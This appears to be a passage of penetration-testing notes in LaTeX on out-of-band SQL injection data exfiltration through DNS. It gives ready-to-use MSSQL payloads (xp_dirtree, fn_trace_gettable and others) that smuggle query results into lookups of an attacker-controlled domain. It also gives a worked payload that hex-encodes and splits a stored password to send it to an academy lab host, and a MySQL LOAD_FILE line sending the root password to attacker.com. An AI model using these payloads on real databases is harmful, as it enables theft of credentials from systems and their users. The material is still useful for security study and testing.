\section{OOB}
\subsection{DNS}

Use methods related to SMB that will trigger DNS requests.

Limitations of using DNS for data exfiltration
\begin{itemize}
    \item A domain name can have maximum of 127 subdomains.
    \item Each subdomains can have maximum of 63 character length.
    \item Maximum length of full domain name is 253 characters.
    \item Due to DNS records caching add unique value to URL for each request.
    \item DNS being plaintext channel any data extracted over DNS will be in clear text format and will be available to intermediary nodes and DNS Server caches. Hence, it is recommended not to exfiltrate sensitive data over DNS.
\end{itemize}


\href{https://app.interactsh.com}{https://app.interactsh.com} and \href{https://github.com/projectdiscovery/interactsh}{interactsh} for DNS OOB


\subsubsection{sqlmap}

need to be run as root on the DNS server to controle DNS requests received

\href{http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281}{DNS exflitration qith sqlmap}


\begin{verbatim}
--dns-domain=rvqvtmob9f778j1ql4gg4c7t5abazz.burpcollaborator.net
\end{verbatim}

\subsubsection{MSSQL Server}


Ensure that whatever query only returns 1 result, or attack may not work correctly. In case of multiple use a concatenation function.

Value received are ASCII hex so need to be converted.

\begin{verbatim}
SQL Function 	
master..xp_dirtree 	
    DECLARE @T varchar(1024);
    SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');

master..xp_fileexist 	
    DECLARE @T VARCHAR(1024);
    SELECT @T=(SELECT 1234);
    EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');

master..xp_subdirs 	
    DECLARE @T VARCHAR(1024);
    SELECT @T=(SELECT 1234);
    EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');

sys.dm_os_file_exists 	
    DECLARE @T VARCHAR(1024);
    SELECT @T=(SELECT 1234);
    SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');

fn_trace_gettable 	
    DECLARE @T VARCHAR(1024);
    SELECT @T=(SELECT 1234);
    SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);

fn_get_audit_file 	
    DECLARE @T VARCHAR(1024);
    SELECT @T=(SELECT 1234);
    SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
\end{verbatim}

Spliting the value:
\begin{verbatim}
DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63); 

SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) 
    from users WHERE username='maria'; 

SELECT @A=SUBSTRING(@T,3,63); 
SELECT @B=SUBSTRING(@T,3+63,63); 

SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
\end{verbatim}


\subsubsection{MySQL Server}

\begin{verbatim}
SELECT LOAD_FILE(concat('\\\\',(SELECT password from user where login='root' LIMIT 1), '.attacker.com\\foo'));
\end{verbatim}

\subsubsection{PostgreSQL}

\subsection{HTTP}

\subsection{Links}

\begin{itemize}
    \item \href{https://notsosecure.com/out-band-exploitation-oob-cheatsheet}{OOB cheatsheet}
\end{itemize}
